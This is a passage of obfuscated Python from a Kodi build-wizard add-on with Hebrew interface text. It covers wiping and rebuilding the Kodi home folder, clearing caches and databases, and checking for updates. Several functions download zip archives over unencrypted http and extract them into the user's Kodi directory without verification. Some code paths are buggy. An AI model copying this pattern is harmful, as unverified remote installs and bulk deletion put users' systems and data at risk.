		if DIALOG .yesno (ADDONTITLE ,'[COLOR %s]Would you like to remove [COLOR %s]ALL[/COLOR] empty addon data folders in you Userdata folder?[/COLOR]'%(COLOR2 ,COLOR1 ),yeslabel ='[B][COLOR green]Remove Data[/COLOR][/B]',nolabel ='[B][COLOR red]Don\'t Remove[/COLOR][/B]'):#line:4534
			O00O0O0OO00O0OOO0 =wiz .emptyfolder (ADDOND )#line:4535
			wiz .LogNotify ('[COLOR %s]Remove Empty Folders[/COLOR]'%COLOR1 ,'[COLOR %s]%s Folders(s) Removed[/COLOR]'%(COLOR2 ,O00O0O0OO00O0OOO0 ))#line:4536
		else :wiz .LogNotify ('[COLOR %s]Remove Empty Folders[/COLOR]'%COLOR1 ,'[COLOR %s]Cancelled![/COLOR]'%COLOR2 )#line:4537
	else :#line:4538
		O0O0O00O000O0OOO0 =os .path .join (USERDATA ,'addon_data',OO000000OO0OOO000 )#line:4539
		if OO000000OO0OOO000 in EXCLUDES :#line:4540
			wiz .LogNotify ("[COLOR %s]Protected Plugin[/COLOR]"%COLOR1 ,"[COLOR %s]Not allowed to remove Addon_Data[/COLOR]"%COLOR2 )#line:4541
		elif os .path .exists (O0O0O00O000O0OOO0 ):#line:4542
			if DIALOG .yesno (ADDONTITLE ,'[COLOR %s]Would you also like to remove the addon data for:[/COLOR]'%COLOR2 ,'[COLOR %s]%s[/COLOR]'%(COLOR1 ,OO000000OO0OOO000 ),yeslabel ='[B][COLOR green]Remove Data[/COLOR][/B]',nolabel ='[B][COLOR red]Don\'t Remove[/COLOR][/B]'):#line:4543
				wiz .cleanHouse (O0O0O00O000O0OOO0 )#line:4544
				try :#line:4545
					shutil .rmtree (O0O0O00O000O0OOO0 )#line:4546
				except :#line:4547
					wiz .log ("Error deleting: %s"%O0O0O00O000O0OOO0 )#line:4548
			else :#line:4549
				wiz .log ('Addon data for %s was not removed'%OO000000OO0OOO000 )#line:4550
	wiz .refresh ()#line:4551
def restoreit (O0O0000O0O0OOOOO0 ):#line:4553
	if O0O0000O0O0OOOOO0 =='build':#line:4554
		OOOOOOO00OOOO00OO =freshStart ('restore')#line:4555
		if OOOOOOO00OOOO00OO ==False :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Local Restore Cancelled[/COLOR]"%COLOR2 );return #line:4556
	if not wiz .currSkin ()in ['skin.confluence','skin.estouchy','skin.estuary','skin.Premium.mod']:#line:4557
		wiz .skinToDefault ()#line:4558
	wiz .restoreLocal (O0O0000O0O0OOOOO0 )#line:4559
def restoreextit (OOO0O00OOOO0000OO ):#line:4561
	if OOO0O00OOOO0000OO =='build':#line:4562
		O0O00OO00OOO0OOOO =freshStart ('restore')#line:4563
		if O0O00OO00OOO0OOOO ==False :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]External Restore Cancelled[/COLOR]"%COLOR2 );return #line:4564
	wiz .restoreExternal (OOO0O00OOOO0000OO )#line:4565
def buildInfo (OO00O00000O00000O ):#line:4567
	if wiz .workingURL (ld (BL ))==True :#line:4568
		if wiz .checkBuild (OO00O00000O00000O ,'url'):#line:4569
			OO00O00000O00000O ,O0O00O00OOO00O0OO ,O00000OOOO000OO0O ,OO0000000OO0OO0O0 ,O0O0O0OO00O0000O0 ,OOOO0OOOOO00O0OO0 ,OOOO00OOO0O00OOO0 ,OOOO00000O0O0O00O ,O0OOOOOOOOOO0OO00 ,O0OO00O0O0O000O0O ,OOO0OOOOO0O0O0O00 ,O0OO000O0OO0OO000 ,O000OOOOOO0O00000 =wiz .checkBuild (OO00O00000O00000O ,'all')#line:4570
			O0OO00O0O0O000O0O ='Yes'if O0OO00O0O0O000O0O .lower ()=='yes'else 'No'#line:4571
			OOOOOOO0O0OOOOOOO ="[COLOR %s]שם הבילד:[/COLOR] [COLOR %s]%s[/COLOR][CR]"%(COLOR2 ,COLOR1 ,OO00O00000O00000O )#line:4572
			OOOOOOO0O0OOOOOOO +="[COLOR %s]גירסת הבילד:[/COLOR] [COLOR %s]%s[/COLOR][CR]"%(COLOR2 ,COLOR1 ,O0O00O00OOO00O0OO )#line:4573
			if not O0OO000O0OO0OO000 =="http://":#line:4574
				O0000OOO0O00000O0 =wiz .themeCount (OO00O00000O00000O ,False )#line:4575
				OOOOOOO0O0OOOOOOO +="[COLOR %s]Build Theme(s):[/COLOR] [COLOR %s]%s[/COLOR][CR]"%(COLOR2 ,COLOR1 ,', '.join (O0000OOO0O00000O0 ))#line:4576
			OOOOOOO0O0OOOOOOO +="[COLOR %s]קודי גירסה:[/COLOR] [COLOR %s]%s[/COLOR][CR]"%(COLOR2 ,COLOR1 ,O0O0O0OO00O0000O0 )#line:4577
			OOOOOOO0O0OOOOOOO +="[COLOR %s]Adult Content:[/COLOR] [COLOR %s]%s[/COLOR][CR]"%(COLOR2 ,COLOR1 ,O0OO00O0O0O000O0O )#line:4578
			OOOOOOO0O0OOOOOOO +="[COLOR %s]תאור:[/COLOR] [COLOR %s]%s[/COLOR][CR]"%(COLOR2 ,COLOR1 ,OOO0OOOOO0O0O0O00 )#line:4579
			wiz .TextBox (ADDONTITLE ,OOOOOOO0O0OOOOOOO )#line:4580
		else :wiz .log ("Invalid Build Name!")#line:4581
	else :wiz .log ("Build text file not working: %s"%WORKINGURL )#line:4582
def buildVideo (O00O00O0OO0000O00 ):#line:4584
	wiz .log ("DDDDDDDDDDDDDDDDDDDDDDDDD: %s"%wiz .workingURL (ld (BL )))#line:4585
	if wiz .workingURL (ld (BL ))==True :#line:4586
		O0OO000OO0O0O0O00 =wiz .checkBuild (O00O00O0OO0000O00 ,'preview')#line:4587
		wiz .log ("FFFFFFFFFFFFFFFFFFFFFFFFFF: %s"%O00O00O0OO0000O00 )#line:4588
		if O0OO000OO0O0O0O00 and not O0OO000OO0O0O0O00 =='http://':playVideo (O0OO000OO0O0O0O00 )#line:4589
		else :wiz .log ("[%s]Unable to find url for video preview"%O00O00O0OO0000O00 )#line:4590
	else :wiz .log ("Build text file not working: %s"%WORKINGURL )#line:4591
def dependsList (OOO000OO0OOO0OO0O ):#line:4593
	O0O0OOOOO0O00O00O =os .path .join (ADDONS ,OOO000OO0OOO0OO0O ,'addon.xml')#line:4594
	if os .path .exists (O0O0OOOOO0O00O00O ):#line:4595
		OO00000OO0O0OO000 =open (O0O0OOOOO0O00O00O ,mode ='r');O0OOO00OO0OOO0O0O =OO00000OO0O0OO000 .read ();OO00000OO0O0OO000 .close ();#line:4596
		OO0O00OOO0OOOO0OO =wiz .parseDOM (O0OOO00OO0OOO0O0O ,'import',ret ='addon')#line:4597
		O00000OO000000O00 =[]#line:4598
		for OOOO00OOOO0OO00O0 in OO0O00OOO0OOOO0OO :#line:4599
			if not 'xbmc.python'in OOOO00OOOO0OO00O0 :#line:4600
				O00000OO000000O00 .append (OOOO00OOOO0OO00O0 )#line:4601
		return O00000OO000000O00 #line:4602
	return []#line:4603
def fixskin ():#line:4606
    if KODIV >=17 and KODIV <18 :#line:4608
        O00O0O00O0O0OO00O =os .path .join (translatepath ("special://home/"),"addons","plugin.program.Anonymous","skinfix","17","guisettings.xml")#line:4610
        O00OO000000O0000O =os .path .join (translatepath ("special://home/"),"userdata","guisettings.xml")#line:4611
        copyfile (O00O0O00O0O0OO00O ,O00OO000000O0000O )#line:4613
        O00O0O00O0O0OO00O =os .path .join (translatepath ("special://home/"),"addons","plugin.program.Anonymous","skinfix","17","settings.xml")#line:4616
        O00OO000000O0000O =os .path .join (translatepath ("special://home/"),"userdata","addon_data","skin.Premium.mod","settings.xml")#line:4617
        copyfile (O00O0O00O0O0OO00O ,O00OO000000O0000O )#line:4619
        xbmcgui .Dialog ().ok ("Kodi Anonymous",'אופס, נראה שהייתה תקלה, לחץ אישור לתיקון הבעיה :)')#line:4623
        os ._exit (1 )#line:4624
    if KODIV >=18 and KODIV <19 :#line:4625
        O00O0O00O0O0OO00O =os .path .join (translatepath ("special://home/"),"addons","plugin.program.Anonymous","skinfix","18","guisettings.xml")#line:4627
        O00OO000000O0000O =os .path .join (translatepath ("special://home/"),"userdata","guisettings.xml")#line:4628
        copyfile (O00O0O00O0O0OO00O ,O00OO000000O0000O )#line:4630
        O00O0O00O0O0OO00O =os .path .join (translatepath ("special://home/"),"addons","plugin.program.Anonymous","skinfix","17","settings.xml")#line:4632
        O00OO000000O0000O =os .path .join (translatepath ("special://home/"),"userdata","addon_data","skin.Premium.mod","settings.xml")#line:4633
        copyfile (O00O0O00O0O0OO00O ,O00OO000000O0000O )#line:4635
        xbmcgui .Dialog ().ok ("Kodi Anonymous",'אופס, נראה שהייתה תקלה, לחץ אישור לתיקון הבעיה :)')#line:4637
        os ._exit (1 )#line:4638
def freshStart (install =None ,over =False ):#line:4642
    O0OOOO0OO00O00000 =os .path .abspath (HOME )#line:4644
    if KODI_VERSION <=18 :#line:4645
        DP .create (ADDONTITLE ,"[COLOR %s]מחשב קבצים ותיקיות"%COLOR2 ,'','אנא המתן![/COLOR]')#line:4646
    else :#line:4647
        DP .create (ADDONTITLE ,'אנא המתן...')#line:4648
    OOOO00O00O00O000O =sum ([len (O0OO0OOOO0OOO0O0O )for OO000O0000O0000O0 ,O00O000O00O0O00OO ,O0OO0OOOO0OOO0O0O in os .walk (O0OOOO0OO00O00000 )]);O0O00O0O0OO000OOO =0 #line:4649
    DP .update (0 ,"[COLOR %s]Gathering Excludes list."%COLOR2 )#line:4650
    EXCLUDES .append ('My_Builds')#line:4651
    EXCLUDES .append ('archive_cache')#line:4652
    EXCLUDES .append ('script.module.requests')#line:4653
    EXCLUDES .append ('script.module.certifi')#line:4654
    EXCLUDES .append ('script.module.future')#line:4655
    EXCLUDES .append ('script.module.chardet')#line:4656
    EXCLUDES .append ('script.module.idna')#line:4657
    EXCLUDES .append ('script.module.urllib3')#line:4658
    if KEEPREPOS =='true':#line:4661
        OOOO0O0000000O0OO =glob .glob (os .path .join (ADDONS ,'repo*/'))#line:4662
        for O0O0000000OOO00OO in OOOO0O0000000O0OO :#line:4663
            OO0O000O00000OOOO =os .path .split (O0O0000000OOO00OO [:-1 ])[1 ]#line:4664
            if not OO0O000O00000OOOO ==EXCLUDES :#line:4665
                EXCLUDES .append (OO0O000O00000OOOO )#line:4666
    if KEEPTELEMEDIA =='true':#line:4668
        EXCLUDES .append ('plugin.video.telemedia')#line:4669
    EXCLUDES .append ('plugin.video.elementum')#line:4671
    EXCLUDES .append ('script.elementum.burst')#line:4672
    EXCLUDES .append ('script.elementum.burst-master')#line:4673
    EXCLUDES .append ('skin.estuary')#line:4674
    DP .update (0 ,"[COLOR yellow]מנקה קבצים ותיקיות, אנא המתן...[/COLOR]")#line:4676
    O000OOO000O0O0000 =wiz .latestDB ('Addons')#line:4677
    for OO0O000OO00O00000 ,O0O0O00O0O0O0O000 ,O0O0OO000OOO0OO00 in os .walk (O0OOOO0OO00O00000 ,topdown =True ):#line:4678
        O0O0O00O0O0O0O000 [:]=[O0O0O00OO000O0O0O for O0O0O00OO000O0O0O in O0O0O00O0O0O0O000 if O0O0O00OO000O0O0O not in EXCLUDES ]#line:4679
        for OO000OO000OO000O0 in O0O0OO000OOO0OO00 :#line:4680
            O0O00O0O0OO000OOO +=1 #line:4681
            O00OOO00000OOO00O =OO0O000OO00O00000 .replace ('/','\\').split ('\\')#line:4682
            OOO0O000OOO0OO00O =len (O00OOO00000OOO00O )-1 #line:4684
            if O00OOO00000OOO00O [OOO0O000OOO0OO00O -2 ]=='userdata'and O00OOO00000OOO00O [OOO0O000OOO0OO00O -1 ]=='addon_data'and 'script.skinshortcuts'in O00OOO00000OOO00O [OOO0O000OOO0OO00O ]and KEEPSKIN =='true':wiz .log ("Keep Skin: %s"%os .path .join (OO0O000OO00O00000 ,OO000OO000OO000O0 ),5 )#line:4685
            elif O00OOO00000OOO00O [OOO0O000OOO0OO00O -2 ]=='userdata'and O00OOO00000OOO00O [OOO0O000OOO0OO00O -1 ]=='addon_data'and 'pvr.iptvsimple'in O00OOO00000OOO00O [OOO0O000OOO0OO00O ]and KEEPPVR =='true':wiz .log ("Keep Pvr: %s"%os .path .join (OO0O000OO00O00000 ,OO000OO000OO000O0 ),5 )#line:4688
            elif OO000OO000OO000O0 =='sources.xml'and O00OOO00000OOO00O [-1 ]=='userdata'and KEEPSOURCES =='true':wiz .log ("Keep Sources: %s"%os .path .join (OO0O000OO00O00000 ,OO000OO000OO000O0 ),5 )#line:4690
            elif OO000OO000OO000O0 =='favourites.xml'and O00OOO00000OOO00O [-1 ]=='userdata'and KEEPFAVS =='true':wiz .log ("Keep Favourites: %s"%os .path .join (OO0O000OO00O00000 ,OO000OO000OO000O0 ),5 )#line:4692
            elif OO000OO000OO000O0 =='guisettings.xml'and O00OOO00000OOO00O [-1 ]=='userdata'and KEEPSOUND =='true':wiz .log ("Keep Sound: %s"%os .path .join (OO0O000OO00O00000 ,OO000OO000OO000O0 ),5 )#line:4694
            elif OO000OO000OO000O0 .endswith ('.db'):#line:4696
                try :#line:4697
                    if OO000OO000OO000O0 ==O000OOO000O0O0000 and KODIV >=17 :wiz .log ("Ignoring %s on v%s"%(OO000OO000OO000O0 ,KODIV ),5 )#line:4698
                    else :os .remove (os .path .join (OO0O000OO00O00000 ,OO000OO000OO000O0 ))#line:4699
                except Exception as O0OO0OOO00O000O0O :#line:4700
                    if not OO000OO000OO000O0 .startswith ('Textures13'):#line:4701
                        wiz .log ('Failed to delete, Purging DB',5 )#line:4702
                        wiz .log ("-> %s"%(str (O0OO0OOO00O000O0O )),5 )#line:4703
                        wiz .purgeDb (os .path .join (OO0O000OO00O00000 ,OO000OO000OO000O0 ))#line:4704
            else :#line:4705
                if KODI_VERSION <=18 :#line:4706
                    DP .update (int (wiz .percentage (O0O00O0O0OO000OOO ,OOOO00O00O00O000O )),'','[COLOR %s]File: [/COLOR][COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,OO000OO000OO000O0 ),'')#line:4707
                try :os .remove (os .path .join (OO0O000OO00O00000 ,OO000OO000OO000O0 ))#line:4711
                except Exception as O0OO0OOO00O000O0O :#line:4712
                    wiz .log ("Error removing %s"%os .path .join (OO0O000OO00O00000 ,OO000OO000OO000O0 ),5 )#line:4713
                    wiz .log ("-> / %s"%(str (O0OO0OOO00O000O0O )),5 )#line:4714
        if DP .iscanceled ():#line:4715
            DP .close ()#line:4716
            xbmc .executebuiltin ('Dialog.Close(busydialognocancel)')#line:4717
            wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]ההתקנה מבוטלת[/COLOR]"%COLOR2 )#line:4718
            sys .exit ()#line:4719
            return False #line:4720
    for OO0O000OO00O00000 ,O0O0O00O0O0O0O000 ,O0O0OO000OOO0OO00 in os .walk (O0OOOO0OO00O00000 ,topdown =True ):#line:4721
        O0O0O00O0O0O0O000 [:]=[OOOOOO00000O00O00 for OOOOOO00000O00O00 in O0O0O00O0O0O0O000 if OOOOOO00000O00O00 not in EXCLUDES ]#line:4722
        for OO000OO000OO000O0 in O0O0O00O0O0O0O000 :#line:4723
          if KODI_VERSION <=18 :#line:4725
                DP .update (100 ,'','Cleaning Up Empty Folder: [COLOR %s]%s[/COLOR]'%(COLOR1 ,OO000OO000OO000O0 ),'')#line:4726
          else :#line:4727
                DP .update (100 ,'Cleaning Up Empty Folder: [COLOR %s]%s[/COLOR]'%(COLOR1 ,OO000OO000OO000O0 ))#line:4728
          if OO000OO000OO000O0 not in ["Database","userdata","temp","addons","addon_data"]:#line:4729
           if not (OO000OO000OO000O0 =='script.skinshortcuts'and KEEPSKIN =='true'):#line:4730
              if not (OO000OO000OO000O0 =='pvr.iptvsimple'and KEEPPVR =='true'):#line:4731
               shutil .rmtree (os .path .join (OO0O000OO00O00000 ,OO000OO000OO000O0 ),ignore_errors =True ,onerror =None )#line:4732
        if DP .iscanceled ():#line:4733
            DP .close ()#line:4734
            wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]ההתקנה מבוטלת.[/COLOR]"%COLOR2 )#line:4735
            sys .exit ()#line:4736
    DP .close ()#line:4737
def clearCache ():#line:4745
		wiz .clearCache ()#line:4746
def fixwizard ():#line:4750
		wiz .fixwizard ()#line:4751
def totalClean ():#line:4753
        wiz .clearCache ()#line:4755
        wiz .clearPackages ('total')#line:4756
        clearThumb ('total')#line:4757
        cleanfornewbuild ()#line:4758
        wiz .emptyfolder (ADDOND )#line:4759
        wiz .emptyfolder (ADDONS )#line:4760
        wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]ניקוי קאש מלא בוצע בהצלחה.[/COLOR]'%COLOR2 )#line:4761
def cleanfornewbuild ():#line:4762
		try :#line:4763
			os .remove (os .path .join (translatepath ("special://userdata/"),"addon_data","plugin.video.idanplus","epg.xml"))#line:4764
		except :#line:4765
			pass #line:4766
		try :#line:4767
			os .remove (os .path .join (translatepath ("special://userdata/"),"addon_data","plugin.video.idanplus","epg.json"))#line:4768
		except :#line:4769
			pass #line:4770
		try :#line:4771
			os .remove (os .path .join (translatepath ("special://userdata/"),"addon_data","plugin.video.idanplus","series.json"))#line:4772
		except :#line:4773
			pass #line:4774
def clearThumb (type =None ):#line:4775
	O00O0OOO0OO00O0OO =wiz .latestDB ('Textures')#line:4776
	if not type ==None :O0O0O0OO0OOO00O00 =1 #line:4777
	else :O0O0O0OO0OOO00O00 =DIALOG .yesno (ADDONTITLE ,'[COLOR %s]Would you like to delete the %s and Thumbnails folder?'%(COLOR2 ,O00O0OOO0OO00O0OO ),"They will repopulate on the next startup[/COLOR]",nolabel ='[B][COLOR red]Don\'t Delete[/COLOR][/B]',yeslabel ='[B][COLOR green]Delete Thumbs[/COLOR][/B]')#line:4778
	if O0O0O0OO0OOO00O00 ==1 :#line:4779
		try :wiz .removeFile (os .join (DATABASE ,O00O0OOO0OO00O0OO ))#line:4780
		except :wiz .log ('Failed to delete, Purging DB.');wiz .purgeDb (O00O0OOO0OO00O0OO )#line:4781
		wiz .removeFolder (THUMBS )#line:4782
	else :wiz .log ('Clear thumbnames cancelled')#line:4784
	wiz .redoThumbs ()#line:4785
def purgeDb ():#line:4787
	O00O00O0O00O00O0O =[];O0O0OO000O00O0O0O =[]#line:4788
	for O0O00O0OO0OOO0O00 ,OO000O000OOO000OO ,OOOOO0000OO0000OO in os .walk (HOME ):#line:4789
		for O00OOO0O0OO0000OO in fnmatch .filter (OOOOO0000OO0000OO ,'*.db'):#line:4790
			if O00OOO0O0OO0000OO !='Thumbs.db':#line:4791
				O0OO0O000OO0O0O0O =os .path .join (O0O00O0OO0OOO0O00 ,O00OOO0O0OO0000OO )#line:4792
				O00O00O0O00O00O0O .append (O0OO0O000OO0O0O0O )#line:4793
				O00OO0O0OOOOOO0OO =O0OO0O000OO0O0O0O .replace ('\\','/').split ('/')#line:4794
				O0O0OO000O00O0O0O .append ('(%s) %s'%(O00OO0O0OOOOOO0OO [len (O00OO0O0OOOOOO0OO )-2 ],O00OO0O0OOOOOO0OO [len (O00OO0O0OOOOOO0OO )-1 ]))#line:4795
	if KODIV >=16 :#line:4796
		OOOOOO0000OOO00OO =DIALOG .multiselect ("[COLOR %s]Select DB File to Purge[/COLOR]"%COLOR2 ,O0O0OO000O00O0O0O )#line:4797
		if OOOOOO0000OOO00OO ==None :wiz .LogNotify ("[COLOR %s]Purge Database[/COLOR]"%COLOR1 ,"[COLOR %s]Cancelled[/COLOR]"%COLOR2 )#line:4798
		elif len (OOOOOO0000OOO00OO )==0 :wiz .LogNotify ("[COLOR %s]Purge Database[/COLOR]"%COLOR1 ,"[COLOR %s]Cancelled[/COLOR]"%COLOR2 )#line:4799
		else :#line:4800
			for O0OOO0OO0O00OO000 in OOOOOO0000OOO00OO :wiz .purgeDb (O00O00O0O00O00O0O [O0OOO0OO0O00OO000 ])#line:4801
	else :#line:4802
		OOOOOO0000OOO00OO =DIALOG .select ("[COLOR %s]Select DB File to Purge[/COLOR]"%COLOR2 ,O0O0OO000O00O0O0O )#line:4803
		if OOOOOO0000OOO00OO ==-1 :wiz .LogNotify ("[COLOR %s]Purge Database[/COLOR]"%COLOR1 ,"[COLOR %s]Cancelled[/COLOR]"%COLOR2 )#line:4804
		else :wiz .purgeDb (O00O00O0O00O00O0O [O0OOO0OO0O00OO000 ])#line:4805
def fastupdatefirstbuild (O000000O00O00000O ):#line:4811
    try :#line:4813
        checkidupdate ()#line:4814
    except Exception as OO0OOO00O0OOOOO0O :#line:4815
        logging .warning ('בעיה בעדכון המהיר======================================')#line:4816
        logging .warning (str (OO0OOO00O0OOOOO0O ))#line:4817
    O0OOO0OOOO0O000OO ,O0O000000OO00OO0O =wiz .splitNotify (NOTIFICATION )#line:4819
    if not O0OOO0OOOO0O000OO ==False :#line:4820
        try :#line:4821
            O0OOO0OOOO0O000OO =int (O0OOO0OOOO0O000OO );O000000O00O00000O =int (O000000O00O00000O )#line:4822
            wiz .setS ("notedismiss","true")#line:4824
            if O0OOO0OOOO0O000OO ==O000000O00O00000O :#line:4825
                wiz .log ("[Notifications] id[%s] Dismissed"%int (O0OOO0OOOO0O000OO ),5 )#line:4826
            elif O0OOO0OOOO0O000OO >O000000O00O00000O :#line:4828
                wiz .log ("[Notifications] id: %s"%str (O0OOO0OOOO0O000OO ),5 )#line:4829
                wiz .setS ('noteid',str (O0OOO0OOOO0O000OO ))#line:4830
                wiz .setS ("notedismiss","true")#line:4831
                wiz .log ("[Notifications] Complete",5 )#line:4834
        except Exception as OO0OOO00O0OOOOO0O :#line:4835
            wiz .log ("Error on Notifications Window: %s"%str (OO0OOO00O0OOOOO0O ),5 )#line:4836
def checkUpdate ():#line:4838
	O0OOO00OO000OOO0O =wiz .getS ('disableupdate')#line:4839
	OO0O0OO0OO0O00O0O =wiz .getS ('buildname')#line:4840
	O00O0OOO0000OOO00 =wiz .getS ('buildversion')#line:4841
	OO0OO0OO0OOO0OOOO =wiz .openURL (ld (BL )).replace ('\n','').replace ('\r','').replace ('\t','')#line:4842
	OOO0O0000O000OOO0 =re .compile ('name="%s".+?ersion="(.+?)".+?con="(.+?)".+?anart="(.+?)"'%OO0O0OO0OO0O00O0O ).findall (OO0OO0OO0OOO0OOOO )#line:4843
	if len (OOO0O0000O000OOO0 )>0 :#line:4844
		O000OOOOOOO00O0O0 =OOO0O0000O000OOO0 [0 ][0 ]#line:4845
		O0OOO000O00O00OOO =OOO0O0000O000OOO0 [0 ][1 ]#line:4846
		OOO0O0OO00OOO00OO =OOO0O0000O000OOO0 [0 ][2 ]#line:4847
		wiz .setS ('latestversion',O000OOOOOOO00O0O0 )#line:4848
		if O000OOOOOOO00O0O0 >O00O0OOO0000OOO00 :#line:4849
			if O0OOO00OO000OOO0O =='false':#line:4850
				wiz .log ("[Check Updates] [Installed Version: %s] [Current Version: %s] Opening Update Window"%(O00O0OOO0000OOO00 ,O000OOOOOOO00O0O0 ),5 )#line:4851
				notify .updateWindow (OO0O0OO0OO0O00O0O ,O00O0OOO0000OOO00 ,O000OOOOOOO00O0O0 ,O0OOO000O00O00OOO ,OOO0O0OO00OOO00OO )#line:4852
			else :wiz .log ("[Check Updates] [Installed Version: %s] [Current Version: %s] Update Window Disabled"%(O00O0OOO0000OOO00 ,O000OOOOOOO00O0O0 ),5 )#line:4853
		else :wiz .log ("[Check Updates] [Installed Version: %s] [Current Version: %s]"%(O00O0OOO0000OOO00 ,O000OOOOOOO00O0O0 ),5 )#line:4854
	else :wiz .log ("[Check Updates] ERROR: Unable to find build version in build text file",5 )#line:4855
def checkidupdate ():#line:4857
                O000O0OOOO0OOOOO0 =[]#line:4858
                O000O0OOOO0OOOOO0 .append (Thread (wiz .LogNotify ,"[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]מוריד עדכון אחרון.[/COLOR]'%COLOR2 ))#line:4859
                O000O0OOOO0OOOOO0 [0 ].start ()#line:4861
                OO000OO00O0O00OOO =wiz .workingURL (NOTIFICATION )#line:4862
                OO00OO0OO00000OOO =" Kodi Premium"#line:4863
                OO00O000O0OO00O0O =wiz .checkBuild (OO00OO0OO00000OOO ,'gui')#line:4864
                O00OO0O0OOO0OO0O0 =OO00OO0OO00000OOO .replace ('\\','').replace ('/','').replace (':','').replace ('*','').replace ('?','').replace ('"','').replace ('<','').replace ('>','').replace ('|','')#line:4865
                if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:4867
                try :#line:4868
                    DP .create (ADDONTITLE ,'[COLOR %s][B]מוריד עדכון אחרון[/B][/COLOR][COLOR %s][/COLOR]'%(COLOR1 ,OO00OO0OO00000OOO ),'','אנא המתן')#line:4869
                except :#line:4870
                    DP .create (ADDONTITLE ,'[COLOR %s][B]מוריד עדכון אחרון[/B][/COLOR][COLOR %s][/COLOR]'%(COLOR1 ,OO00OO0OO00000OOO ))#line:4871
                OO0000OOO000O0O0O =os .path .join (PACKAGES ,'%s_guisettings.zip'%O00OO0O0OOO0OO0O0 )#line:4872
                if 'google'in OO00O000O0OO00O0O :#line:4875
                   googledrive_download (OO00O000O0OO00O0O ,OO0000OOO000O0O0O ,DP ,wiz .checkBuild (OO00OO0OO00000OOO ,'updatesize'))#line:4876
                else :#line:4879
                  downloader .download (OO00O000O0OO00O0O ,OO0000OOO000O0O0O ,DP )#line:4880
                xbmc .sleep (100 )#line:4881
                O0O0OOO0O0O0O0O00 ='עדכון אחרון'#line:4882
                OO0O0000OO0000O0O ='[COLOR %s][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,O0O0OOO0O0O0O0O00 )#line:4883
                try :#line:4884
                    DP .update (0 ,OO0O0000OO0000O0O ,'','אנא המתן')#line:4885
                except :#line:4886
                    DP .update (0 ,OO0O0000OO0000O0O +'\n'+''+'\n'+'אנא המתן')#line:4887
                extract .all (OO0000OOO000O0O0O ,HOME ,DP ,title =OO0O0000OO0000O0O )#line:4888
                DP .close ()#line:4889
                try :os .remove (OO0000OOO000O0O0O )#line:4890
                except :pass #line:4891
                if KODIV >=18 and KODIV <19 :#line:4894
                    skindialogsettind18 ()#line:4895
                fix_Dialog_Settings17 ()#line:4896
                wiz .setS ("notedismiss","true")#line:4897
def checkidupdate_movie ():#line:4901
    wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]מעדכן חבילות סרטים[/COLOR]'%COLOR2 )#line:4903
    wiz .setS ("notedismiss3","true")#line:4904
    OOO00OO0O0O0O0OOO ='http://kodi.life/movie/update_movie.xml'#line:4905
    OOOO00OO00OOOO0OO =wiz .workingURL (OOO00OO0O0O0O0OOO )#line:4906
    OO00OOOO00O0O0000 =" Kodi Premium"#line:4908
    OOOO0OOOOOO00000O ='http://kodi.life/movie/movie.zip'#line:4909
    OOOOOOOOOO00000O0 =OO00OOOO00O0O0000 .replace ('\\','').replace ('/','').replace (':','').replace ('*','').replace ('?','').replace ('"','').replace ('<','').replace ('>','').replace ('|','')#line:4910
    if not wiz .workingURL (OOOO0OOOOOO00000O )==True :return #line:4911
    if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:4912
    try :#line:4913
        DP .create (ADDONTITLE ,'[COLOR %s][B]מוריד חבילת סרטים[/B][/COLOR][COLOR %s][/COLOR]'%(COLOR1 ,OO00OOOO00O0O0000 ),'','אנא המתן')#line:4914
    except :#line:4915
        DP .create (ADDONTITLE ,'[COLOR %s][B]מוריד חבילת סרטים[/B][/COLOR][COLOR %s][/COLOR]'%(COLOR1 ,OO00OOOO00O0O0000 ))#line:4916
    O0O00OO000OO0OO00 =os .path .join (PACKAGES ,'%s_guisettings.zip'%OOOOOOOOOO00000O0 )#line:4917
    if 'google'in OOOO0OOOOOO00000O :#line:4920
       googledrive_download (OOOO0OOOOOO00000O ,O0O00OO000OO0OO00 ,DP ,wiz .checkBuild (OO00OOOO00O0O0000 ,'updatesize'))#line:4921
    else :#line:4923
      downloader .download (OOOO0OOOOOO00000O ,O0O00OO000OO0OO00 ,DP )#line:4924
    xbmc .sleep (100 )#line:4925
    O0OOO00000O0000O0 ='מעדכן סרטים'#line:4926
    O00OOOO0000OOOO00 ='[COLOR %s][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,O0OOO00000O0000O0 )#line:4927
    try :#line:4928
        DP .update (0 ,O00OOOO0000OOOO00 ,'','אנא המתן')#line:4929
    except :#line:4930
        DP .update (0 ,O00OOOO0000OOOO00 +'\n'+''+'\n'+'אנא המתן')#line:4931
    extract .all (O0O00OO000OO0OO00 ,HOME ,DP ,title =O00OOOO0000OOOO00 )#line:4932
    try :os .remove (O0O00OO000OO0OO00 )#line:4933
    except :pass #line:4934
    DP .close ()#line:4935
    if INSTALLMETHOD ==1 :OOOOO00O0O00OOOOO =1 #line:4937
    elif INSTALLMETHOD ==2 :OOOOO00O0O00OOOOO =0 #line:4938
    else :DP .close ()#line:4939
def checkidupdatetele (info =''):#line:4943
    O0OOO00OO0OO00OO0 =wiz .workingURL (NOTIFICATION )#line:4944
    OOO0O00O000000O0O =" Kodi Premium"#line:4945
    O0O00O0O000O0O0O0 =wiz .checkBuild (OOO0O00O000000O0O ,'gui')#line:4946
    OOOO000O0OOOOOOOO =OOO0O00O000000O0O .replace ('\\','').replace ('/','').replace (':','').replace ('*','').replace ('?','').replace ('"','').replace ('<','').replace ('>','').replace ('|','')#line:4947
    if not wiz .workingURL (O0O00O0O000O0O0O0 )==True :return #line:4948
    if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:4949
